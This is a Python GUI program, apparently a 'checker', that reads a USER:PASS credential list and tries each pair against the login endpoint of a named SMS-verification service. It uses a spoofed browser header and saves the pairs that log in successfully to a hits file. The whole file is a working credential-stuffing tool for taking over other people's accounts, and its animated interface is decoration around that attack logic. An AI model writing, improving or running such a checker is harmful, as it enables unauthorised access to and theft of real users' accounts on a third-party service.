import requests
import tkinter as tk
from tkinter import messagebox, filedialog, ttk
import threading
import random
import math
import os

# === CHECKER AYARLARI ===
HITS_FILE = "hits.txt"
FAILS_FILE = "fails.txt"

class SMSOnayChecker:
    def __init__(self):
        self.accounts = []
        self.running = False
        self.hits = 0
        self.fails = 0

    def load_file(self):
        file_path = filedialog.askopenfilename(title="Hesap Listesini Seç (USER:PASS)", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "r", encoding="utf-8") as f:
                self.accounts = [line.strip() for line in f if ":" in line]
            messagebox.showinfo("Başarılı", f"{len(self.accounts)} hesap yüklendi!")

    def check_logic(self, email, password):
        url = "https://smsonay.app/panel/ajax/login"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*"
        }
        payload = {"email": email, "password": password}
        
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            res_text = response.text
            
            if '{"success":true,"' in res_text:
                return "SUCCESS"
            elif 'success":false' in res_text or 'Ba\\u015far\\u0131s\\u0131z' in res_text:
                return "FAILURE"
            return "ERROR"
        except:
            return "RETRY"

    def worker(self, update_ui_func):
        for acc in self.accounts:
            if not self.running: break
            
            user, pwd = acc.split(":", 1)
            result = self.check_logic(user, pwd)
            
            if result == "SUCCESS":
                self.hits += 1
                with open(HITS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
                update_ui_func(f"[HIT] {user}", "green")
            else:
                self.fails += 1
                with open(FAILS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
                update_ui_func(f"[FAIL] {user}", "red")
            
            # İstatistikleri güncelle
            stats_label.config(text=f"HITS: {self.hits} | FAILS: {self.fails} | KALAN: {len(self.accounts)-(self.hits+self.fails)}")

        self.running = False
        messagebox.showinfo("Bitti", "Tarama işlemi tamamlandı!")

# === UI TASARIMI VE ANIMASYON ===
def start_app():
    checker = SMSOnayChecker()
    root = tk.Tk()
    root.title("SMSOnay Account Checker - WASD Edition")
    root.geometry("800x600")
    root.configure(bg="#050505")

    # --- ARKA PLAN (YOĞUN WASD) ---
    canvas = tk.Canvas(root, bg="#050505", highlightthickness=0)
    canvas.place(relx=0, rely=0, relwidth=1, relheight=1)

    particles = []
    for _ in range(200):
        size = random.randint(10, 28)
        p = canvas.create_text(random.randint(0, 800), random.randint(0, 600),
                               text="WASD", font=("Arial", size, "bold"),
                               fill=random.choice(["#111", "#1a1a1a", "#222"]))
        particles.append([p, random.uniform(-0.5, 0.5), random.uniform(-1.2, -0.4)])

    def animate():
        mx, my = root.winfo_pointerx() - root.winfo_rootx(), root.winfo_pointery() - root.winfo_rooty()
        for p in particles:
            canvas.move(p[0], p[1], p[2])
            pos = canvas.coords(p[0])
            if pos:
                dist = math.sqrt((pos[0]-mx)**2 + (pos[1]-my)**2)
                if dist < 120: canvas.move(p[0], (pos[0]-mx)/8, (pos[1]-my)/8)
                if pos[1] < -30: canvas.coords(p[0], random.randint(0, 800), 630)
        canvas.tag_lower("all")
        root.after(25, animate)

    # --- ÖN PANEL (WIDGETLAR) ---
    main_frame = tk.Frame(root, bg="#0e0e0e", bd=2, relief="flat")
    main_frame.place(relx=0.5, rely=0.5, anchor="center", width=650, height=450)

    tk.Label(main_frame, text="SMSONAY CHECKER v2", fg="#6366f1", bg="#0e0e0e", font=("Arial", 16, "bold")).pack(pady=10)

    global stats_label
    stats_label = tk.Label(main_frame, text="HITS: 0 | FAILS: 0 | KALAN: 0", fg="white", bg="#0e0e0e", font=("Arial", 10))
    stats_label.pack(pady=5)

    # Console Alanı
    console = tk.Text(main_frame, bg="#050505", fg="#aaa", font=("Consolas", 9), relief="flat", state="disabled")
    console.pack(padx=20, pady=10, fill="both", expand=True)

    def log_to_console(text, color):
        console.config(state="normal")
        console.insert("end", text + "\n")
        # Basit renk etiketleme
        if color == "green": console.tag_add("hit", "end-2l", "end-1l")
        console.tag_config("hit", foreground="#00ff00")
        console.see("end")
        console.config(state="disabled")

    # Butonlar
    btn_frame = tk.Frame(main_frame, bg="#0e0e0e")
    btn_frame.pack(pady=15, fill="x", padx=20)

    def start_thread():
        if not checker.accounts:
            messagebox.showwarning("Hata", "Önce hesap listesini yükle!")
            return
        checker.running = True
        threading.Thread(target=checker.worker, args=(log_to_console,), daemon=True).start()

    tk.Button(btn_frame, text="LİSTE YÜKLE", bg="#222", fg="white", relief="flat", width=15, command=checker.load_file).pack(side="left", padx=5, ipady=5)
    tk.Button(btn_frame, text="BAŞLAT", bg="#6366f1", fg="white", relief="flat", width=15, command=start_thread).pack(side="left", padx=5, ipady=5)
    tk.Button(btn_frame, text="DURDUR", bg="#ef4444", fg="white", relief="flat", width=15, command=lambda: setattr(checker, 'running', False)).pack(side="left", padx=5, ipady=5)

    animate()
    root.mainloop()

if __name__ == "__main__":
    start_app()
